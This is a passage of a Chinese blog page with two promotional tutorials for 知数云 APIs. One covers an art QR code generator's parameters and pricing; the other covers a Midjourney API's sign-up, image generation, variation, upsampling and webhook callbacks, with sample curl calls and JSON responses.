                  <h2 id="二维码宽高比-aspect-ratio"><a href="#二维码宽高比-aspect-ratio" class="headerlink" title="二维码宽高比 aspect_ratio"></a>二维码宽高比 aspect_ratio</h2>
                  <p>通过 aspect_ratio 参数我们可以设置二维码的宽高比，比如正方形 1:1，长方形 16:9 等等，该参数：</p>
                  <ul>
                    <li>1:1：宽高比为 1:1，表示画布的宽度和高度相等。对应的像素尺寸为 768x768，生成的二维码画布为正方形。</li>
                    <li>16:9：宽高比为 16:9，表示画布的宽度是高度的 16/9 倍。对应的像素尺寸为 1008x576，生成的二维码画布宽度较大，适合宽屏显示。</li>
                    <li>9:16：宽高比为 9:16，表示画布的宽度是高度的 9/16 倍。对应的像素尺寸为 576x1008，生成的二维码画布高度较大，适合竖屏显示。</li>
                    <li>4:3：宽高比为 4:3，表示画布的宽度是高度的 4/3 倍。对应的像素尺寸为 864x672，生成的二维码画布略带正方形感，适合一般显示。</li>
                    <li>3:4：宽高比为 3:4，表示画布的宽度是高度的 3/4 倍。对应的像素尺寸为 672x864，生成的二维码画布略带纵向矩形感，适合一般显示。</li>
                  </ul>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "Plate of Nigiri sushi",</span></span><br><span class="line"><span class="string">    "aspect_ratio": "1:1"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们尝试生成了一个正方形的二维码，效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170644.png" alt=""></p>
                  <h2 id="二维码位置-position"><a href="#二维码位置-position" class="headerlink" title="二维码位置 position"></a>二维码位置 position</h2>
                  <p>我们还可以通过 position 参数控制二维码的位置，比如说一张图片里面有一个女生穿裙子，而我们想要把二维码放在裙子的位置并与之融合起来，我们就可以尝试改下二维码的位置，调用样例如下：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "one of the beautiful girls in the moonlight in the background, in the style of pixelated chaos, rococo-inspired art, dark white and sky-blue, made of plastic, delicate flowers, gongbi, wimmelbilder",</span></span><br><span class="line"><span class="string">    "position": "bottom"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170641.png" alt=""></p>
                  <h2 id="二维码像素风格-pixel-style"><a href="#二维码像素风格-pixel-style" class="headerlink" title="二维码像素风格 pixel_style"></a>二维码像素风格 pixel_style</h2>
                  <p>我们还可以自定义二维码的像素风格，通过传入 pixel_style 即可，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：使用方形的像素单元，每个像素单元都是正方形的形状。</li>
                    <li>rounded（圆角）：像素单元具有圆角，使得生成的二维码看起来更加柔和和现代化。</li>
                    <li>dot（点状）：使用小圆点作为像素单元，生成的二维码呈现出点阵的效果，类似于印刷效果。</li>
                    <li>squircle（圆角方形）：类似于圆角矩形，但更加接近圆形的形状，为生成的二维码赋予一种独特的风格。</li>
                    <li>row（行排列）：将像素单元按行排列，呈现出水平方向的图案。</li>
                    <li>column（列排列）：将像素单元按列排列，呈现出垂直方向的图案。</li>
                  </ul>
                  <h2 id="二维码框风格-marker-shape"><a href="#二维码框风格-marker-shape" class="headerlink" title="二维码框风格 marker_shape"></a>二维码框风格 marker_shape</h2>
                  <p>通过 marker_shape 可以自定义定位框的风格，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：标记形状为正方形，用于突出特定位置或元素。</li>
                    <li>circle（圆形）：标记形状为圆形，可用于标记关键区域或元素。</li>
                    <li>plus（加号）：标记形状为加号，类似十字型，用于突出注意或特定信息。</li>
                    <li>box（方框）：标记形状为方框，类似于描边的矩形，可用于围绕区域或元素。</li>
                    <li>octagon（八边形）：标记形状为八边形，带有独特的角落，用于视觉吸引。</li>
                    <li>random（随机）：标记形状随机分布，为二维码添加艺术感和视觉趣味。</li>
                    <li>tiny-plus（微小加号）：微小的加号标记，可用于标记细微的元素或细节。</li>
                  </ul>
                  <h2 id="二维码子标记风格-sub-marker"><a href="#二维码子标记风格-sub-marker" class="headerlink" title="二维码子标记风格 sub_marker"></a>二维码子标记风格 sub_marker</h2>
                  <p>通过 sub_marker 可以用于子标记（较小的标记）的形状，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：子标记的形状为正方形，可以用于突出特定位置的细节。</li>
                    <li>circle（圆形）：子标记的形状为圆形，可用于强调关键细节或元素。</li>
                    <li>box（方框）：子标记的形状为方框，类似于描边的矩形，适用于标记细小区域。</li>
                    <li>random（随机）：子标记的形状随机分布，为二维码添加艺术感和视觉趣味。</li>
                    <li>plus（加号）：子标记的形状为加号，类似十字型，可以用于标记细微的信息或元素。</li>
                  </ul>
                  <h2 id="二维码旋转角度-rotate"><a href="#二维码旋转角度-rotate" class="headerlink" title="二维码旋转角度 rotate"></a>二维码旋转角度 rotate</h2>
                  <p>通过 rotate 可以控制二维码的旋转角度，参数可选值如下：</p>
                  <ul>
                    <li>0：不进行旋转，生成的二维码保持原始方向，没有旋转效果。</li>
                    <li>90：将生成的二维码顺时针旋转 90 度，使其以纵向方向显示。</li>
                    <li>180：将生成的二维码旋转 180 度，使其倒置，即上下颠倒的显示方式。</li>
                    <li>270：将生成的二维码顺时针旋转 270 度，使其以逆纵向方向显示。</li>
                  </ul>
                  <p>在这里我们就不再对各种 API 参数进行一一介绍了，更详细更实时的内容可以参见知数云的官方文档，链接为：<a href="https://data.zhishuyun.com/documents/ee085d2a-a0b9-4f0e-8b4d-8da407345138。" target="_blank" rel="noopener">https://data.zhishuyun.com/documents/ee085d2a-a0b9-4f0e-8b4d-8da407345138。</a></p>
                  <h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2>
                  <p>知数云艺术二维码的 API 提供了阶梯定价，首次申请免费赠送 20 次，而且购买越多越便宜，由于价格会动态调整，所以大家可以查看知数云官网来查看最新实时价格：<a href="https://data.zhishuyun.com/services/38ecf158-36f2-42f2-8e7f-6786cdfc2452" target="_blank" rel="noopener">https://data.zhishuyun.com/services/38ecf158-36f2-42f2-8e7f-6786cdfc2452</a></p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170329.png" alt=""></p>
                  <p>以上便是知数云艺术二维码的一些介绍，希望对大家有帮助，谢谢！</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2023-09-01 23:47:18" itemprop="dateCreated datePublished" datetime="2023-09-01T23:47:18+08:00">2023-09-01</time>
                </span>
                <span id="/42342.html" class="post-meta-item leancloud_visitors" data-flag-title="艺术二维码 API 申请及使用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>6 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42341.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/42341.html" class="post-title-link" itemprop="url">Midjourney API 的申请和使用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h1 id="Midjourney-API-申请及使用"><a href="#Midjourney-API-申请及使用" class="headerlink" title="Midjourney API 申请及使用"></a>Midjourney API 申请及使用</h1>
                  <p>在人工智能绘图领域，想必大家听说过 Midjourney 的大名吧！</p>
                  <p>Midjourney 以其出色的绘图能力在业界独树一帜。无需过多复杂的操作，只要简单输入绘图指令，这个神奇的工具就能在瞬间为我们呈现出对应的图像。无论是任何物体还是任何风格，都能在 Midjourney 的绘画魔法下得以轻松呈现。如今，Midjourney 早已在各个行业和领域广泛应用，其影响力愈发显著。</p>
                  <p>然而，在国内想要使用 Midjourney 却面临着相当大的挑战。首先，Midjourney 目前驻扎在 Discord 平台中，这意味着要使用 Midjourney，必须通过特殊的充值途径获得访问权限。如果没有订阅，几乎无法使用 Midjourney，因此单是使用这一工具就成了一个巨大的难题。此外，有人或许会疑问：Midjourney 是否提供对外 API 服务？然而事实是，Midjourney 并未向外界提供任何 API 服务，而且从目前情况看来，这一情况似乎也不会改变。</p>
                  <p>那么，是否有方法能够与 Midjourney 对接，并将其融入到自己的产品中呢？</p>
                  <p>答案是肯定的。接下来，我将为大家介绍知数云平台所提供的 Midjourney API，通过使用该 API，我们能够实现与 Midjourney 官方完全一致的效果和操作，下文会详细介绍。</p>
                  <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2>
                  <p>知数云平台是什么呢？简单来说，它是一个提供多样数字化 API 的服务平台，其官网链接是：<a href="https://data.zhishuyun.com" target="_blank" rel="noopener" title="https://data.zhishuyun.com">https://data.zhishuyun.com</a>。</p>
                  <p>你可能会疑惑，既然 Midjourney 官方并未向外提供 API，那么知数云平台的 API 是如何诞生的呢？简言之，知数云的 Midjourney 与 Discord 内的 Midjourney Bot 进行了接口对接，同时模拟了底层通信协议，从而能够在 Discord 平台上实现与 Midjourney 官方完全相同的操作。这涵盖了文字生成图片、图像转换、图像融合、图文生成等多个功能。此外，该 API 在后台维护了大量 Midjourney 账号，通过负载均衡控制实现了高度的并发处理，比官方 Midjourney 单一账号的并发能力要更高。</p>
                  <p>总体来看，无论是在 Discord 上使用 Midjourney 提供的哪一项功能，这个 API 都能完全还原官方操作的效果和效能。</p>
                  <p>稳定性如何呢？根据我个人几个月的观察和使用经验，可以毫不夸张地说，目前业界很难找到比知数云 Midjourney API 更稳定且并发处理能力更高的选择，而且还能保持 Midjourney 这一价格水平。这样的选择寥寥无几。</p>
                  <p>下面我们就来了解下这个 API 的申请和使用方法吧。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <blockquote>
                    <p>下文内容大多数来源于知数云 Midjourney API 官方介绍文档，文档链接：<a href="https://data.zhishuyun.com/documents/0fd3dd40-a16a-4246-8313-748b8e75c29e" target="_blank" rel="noopener" title="https://data.zhishuyun.com/documents/0fd3dd40-a16a-4246-8313-748b8e75c29e">https://data.zhishuyun.com/documents/0fd3dd40-a16a-4246-8313-748b8e75c29e</a>，最新内容以官方文档为准。</p>
                  </blockquote>
                  <p>要使用 Midjourney Imagine API，首先可以到 <a href="https://data.zhishuyun.com/documents/58ea7cc1-c685-40c3-a619-f29f9ac5d8f4" target="_blank" rel="noopener" title="Midjourney Imagine API">Midjourney Imagine API</a> 页面点击「获取」按钮：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171908.png" alt=""></p>
                  <p>如果你尚未登录，会自动跳转到登录页面。扫码关注公众号即可自动登录，无需额外注册步骤。</p>
                  <p>登录完了之后会跳回原页面 <a href="https://data.zhishuyun.com/documents/58ea7cc1-c685-40c3-a619-f29f9ac5d8f4" target="_blank" rel="noopener" title="Midjourney Imagine API">Midjourney Imagine API</a> ，此时会提示「您尚未申请该服务，需要申请」。</p>
                  <p>申请时会校验实名认证情况，请按照网站提示完成实名认证。实名认证会校验姓名、手机号、身份证号，需要三者一致才可以通过认证。认证完了之后可以返回页面，刷新一下页面确保信息更新，然后重新申请即可通过申请。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>接下来就可以在界面上填写对应的内容，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171604.png" alt=""></p>
                  <p>在第一次使用该接口时，我们至少需要填写两个参数，一个是 <code>action</code>，另一个是 <code>prompt</code>。其中 <code>action</code> 参数代表了生成图的操作类型，由于第一次调用该 API 我们没有生成过任何内容，所以我们需要先输入文字来生成一副预览图，所以这时候 <code>action</code> 应该填写为 <code>generate</code>。另外一个参数 <code>prompt</code> 就是我们想生成的图片描述内容了，强烈建议用英文描述，画的图会更准确效果更好，这里我们填写了 <code>beautiful dress</code>，代表要画一条好看的裙子。</p>
                  <p>依次填写好图中所示参数，然后点击「测试」按钮即可测试接口。「测试」按钮下方会显示 API 返回的结果。同时您可以注意到右侧有对应的调用代码生成，您可以复制代码到您的 IDE 里面进行对接和开发。</p>
                  <p>调用之后，我们发现返回结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1124768570157564029/1142862320582791268/nglover_beautiful_dress_id4899456_02d66331-b4d5-46bd-b5ea-efa6d9447528.png"</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1142862320582791268"</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upsample1"</span>,</span><br><span class="line">    <span class="string">"upsample2"</span>,</span><br><span class="line">    <span class="string">"upsample3"</span>,</span><br><span class="line">    <span class="string">"upsample4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"cf735d83-6e02-4e0a-a265-3e8ed46b8070"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有如下字段：</p>
                  <p><code>task_id</code>，生成此图像任务的 ID，用于唯一标识此次图像生成任务。</p>
                  <p><code>image_id</code>，图片的唯一标识，在下次需要对图片进行变换操作时需要传此参数。</p>
                  <p><code>image_url</code>，图片的 URL，直接打开即可查看生成的效果，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171611.png" alt=""></p>
                  <p>可以看到，这里生成了一张 2x2 的预览图。</p>
                  <p><code>actions</code>，可以对生成的图片进行的进一步操作列表。这里一共列了 9 个，其中 <code>upsample</code> 代表放大，<code>variation</code> 代表变换，<code>reroll</code> 代表重新生成。所以 <code>upsample1</code> 代表的就是对左上角第一张图片进行放大操作，<code>variation3</code> 就是代表根据左下角第三张图片进行变换操作。</p>
                  <p>到现在为止，第一次 API 调用就完成了。</p>
                  <blockquote>
                    <p>提示：如果您觉得上述生图速度较慢，想进一步提升用户体验，可以考虑采用流式传输的模式或者使用极速 API，具体可参考文档下方内容。</p>
                  </blockquote>
                  <h2 id="图像放大与变换"><a href="#图像放大与变换" class="headerlink" title="图像放大与变换"></a>图像放大与变换</h2>
                  <p>下面我们尝试针对当前生成的照片进行进一步的操作，比如我们觉得右上角第二张的图片还不错，但我们想进行一些变换微调，那么就可以进一步将 <code>action</code> 填写为 <code>variation2</code>，同时将 <code>image_id</code> 传递即可，<code>prompt</code> 可以留空：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171619.png" alt=""></p>
                  <p>这时候得到的结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1124768570157564029/1142864001001345245/handerson6243_beautiful_dress_id4899456_aab4a0bf-7d99-4b7f-818c-c4dc690300ea.png"</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1142864001001345245"</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upsample1"</span>,</span><br><span class="line">    <span class="string">"upsample2"</span>,</span><br><span class="line">    <span class="string">"upsample3"</span>,</span><br><span class="line">    <span class="string">"upsample4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"b6f464b6-0cac-43e7-ae4e-12658679b7f3"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>打开 <code>image_url</code>，新生成的图片如下所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171629.png" alt=""></p>
                  <p>可以看到，针对上一张右上角的图片，我们再次得到了四张类似的照片。</p>
                  <p>这时候我们可以挑选其中一张进行精细化地放大操作，比如选第四张，那就可以 <code>action</code> 传入 <code>upsample4</code>，通过 <code>image_id</code> 再次传入当前图像的 ID 即可。</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171655.png" alt=""></p>
                  <blockquote>
                    <p>注意： <code>upsample</code> 操作相比 <code>variation</code> 来说，Midjourney 的耗时会更短一些。</p>
                  </blockquote>
                  <p>返回结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1124768570157564029/1142864651860840458/ruthgarcia3808_beautiful_dress_id4899456_096f6a64-7412-4cb5-8f50-4afbfc456d55.png"</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1142864651860840458"</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"high_variation"</span>,</span><br><span class="line">    <span class="string">"low_variation"</span>,</span><br><span class="line">    <span class="string">"zoom_out_2x"</span>,</span><br><span class="line">    <span class="string">"zoom_out_1_5x"</span>,</span><br><span class="line">    <span class="string">"pan_left"</span>,</span><br><span class="line">    <span class="string">"pan_right"</span>,</span><br><span class="line">    <span class="string">"pan_up"</span>,</span><br><span class="line">    <span class="string">"pan_down"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"9f5c34e3-c8af-415c-9377-fb46cd47ad45"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 <code>image_url</code> 如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171701.png" alt=""></p>
                  <p>这样我们就成功得到了一张独立的连衣裙的照片。</p>
                  <p>同时注意到 <code>actions</code> 里面又包含了几个可进行的操作，介绍如下：</p>
                  <p><code>high_variation</code>：对画面进行高变换（具体含义请参考 Midjourney 官方）。</p>
                  <p><code>low_variation</code>：对画面进行低变换（具体含义请参考 Midjourney 官方）。</p>
                  <p><code>zoom_out_2x</code>：对画面进行缩小两倍操作（周围区域填充）。</p>
                  <p><code>zoom_out_1_5x</code>：对画面进行缩小 1.5 倍操作（周围区域填充）。</p>
                  <p><code>pan_left</code>：对画面进行左移和填充操作。</p>
                  <p><code>pan_right</code>：对画面进行右移和填充操作。</p>
                  <p><code>pan_top</code>：对画面进行上移和填充操作。</p>
                  <p><code>pan_bottom</code>：对画面进行下移和填充操作。</p>
                  <p>可以继续按照上述流程传入对应的变换指令进行连续生图操作，可以实现无限次连续操作，这里不再一一赘述。</p>
                  <h2 id="图像改写（垫图）"><a href="#图像改写（垫图）" class="headerlink" title="图像改写（垫图）"></a>图像改写（垫图）</h2>
                  <p>该 API 也支持图像改写，俗称垫图，我们可以输入一张图片 URL 以及需要改写的描述文字，该 API 就可以返回改写后的图片。</p>
                  <blockquote>
                    <p>注意：输入的图片 URL 需要是一张纯图片，不能是一个网页里面展示一张图片，否则无法进行图像改写。建议使用图床（如阿里云 OSS、腾讯云 COS、七牛云、又拍云等）来上传获取图片的 URL。</p>
                  </blockquote>
                  <p>假设这里我们有一张图片，URL 是 <a href="https://cdn.zhishuyun.com/20230504-222359.png" target="_blank" rel="noopener" title="https://cdn.zhishuyun.com/20230504-222359.png">https://cdn.zhishuyun.com/20230504-222359.png</a>，是一张小女孩写字的图片：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171707.png" alt=""></p>
                  <p>现在我们想把它转化为卡通风格，可以直接在 <code>prompt</code> 字段将 URL 和要调整的文字一并输入即可，二者用空格分隔，比如：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">https:<span class="comment">//cdn.zhishuyun.com/20230504-222359.png transfer to cartoon style</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>样例调用如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171714.png" alt=""></p>
                  <p>输出结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"9297d5ab-4014-44d4-91c8-a6d8927a0756"</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1103689414850387968"</span>,</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.zhishuyun.com/attachments/1100813695770165341/1103689414850387968/Azyern_Zieca_ignore9297d5ab-4014-44d4-91c8-a6d8927a0756_ec5cda5c-8784-4707-be17-a168786e0c8a.png"</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upsample1"</span>,</span><br><span class="line">    <span class="string">"upsample2"</span>,</span><br><span class="line">    <span class="string">"upsample3"</span>,</span><br><span class="line">    <span class="string">"upsample4"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时候，我们可以看到就得到了类似的卡通风格的图片了：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171717.png" alt=""></p>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Midjourney 生成图片需要等待一段时间，所以本 API 也相应设计为了长等待模式。但在部分场景下，长等待可能会带来一些额外的资源开销，因此本 API 也提供了异步 Webhook 回调的方式，当图片生成成功或失败时，其结果都会通过 HTTP 请求的方式发送到指定的 Webhook 回调 URL。回调 URL 接收到结果之后可以进行进一步的处理。</p>
                  <p>下面演示具体的调用流程。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/" target="_blank" rel="noopener" title="https://webhook.site/">https://webhook.site/</a>，打开该网站即可得到一个 Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-172050.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <a href="https://webhook.site/c62713a6-0487-45bd-9ad2-08a91d7ed12d" target="_blank" rel="noopener" title="https://webhook.site/c62713a6-0487-45bd-9ad2-08a91d7ed12d">https://webhook.site/c62713a6-0487-45bd-9ad2-08a91d7ed12d</a>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入 <code>prompt</code>，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171723.png" alt=""></p>
                  <p>点击测试之后会立即得到一个 <code>task_id</code> 的响应，用于标识当前生成任务的 ID，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171727.png" alt=""></p>
                  <p>稍等片刻，等图片生成结束，可以发发现 Webhook URL 收到了一个 HTTP 请求，如图所示：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-20-171732.png" alt=""></p>
                  <p>其结果就是当前任务的结果，内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
